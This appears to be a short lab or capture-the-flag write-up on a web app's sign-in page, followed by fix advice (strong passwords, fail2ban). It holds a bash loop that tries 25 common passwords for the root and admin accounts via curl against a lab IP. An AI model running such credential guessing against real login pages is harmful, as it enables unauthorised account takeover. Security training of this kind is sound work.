# How to exploit

Doing quickly a small scrypt testing the top 25 most used password as the following one, we found easily the password :
``` bash
    pass=(123456 password 12345678 qwerty abc123 123456789 111111 1234567 iloveyou adobe123 123123 admin 1234567890 letmein photoshop 1234 monkey shadow sunshine 12345 password1 princesse azerty trustno1 000000) #LIST OF PASSWORD
    
for passwd in ${pass[@]}; do
        curl "http://192.168.158.128/?page=signin&username=root&password=$passwd&Login=Login#"
done

for passwd in ${pass[@]}; do
        curl "http://192.168.158.128/?page=signin&username=admin&password=$passwd&Login=Login#"
done
```
You can find the most used password by searching on google "Most used password" or using a dictionary (ex: rockyou)
# Fix
---
* Use a strong password. 8 letters minimum with upper and lower cases, numbers, and multiple special charcaters
* Avoid meaningful password (ex: Date of Birth, names etc.)
* Set up a fail2ban
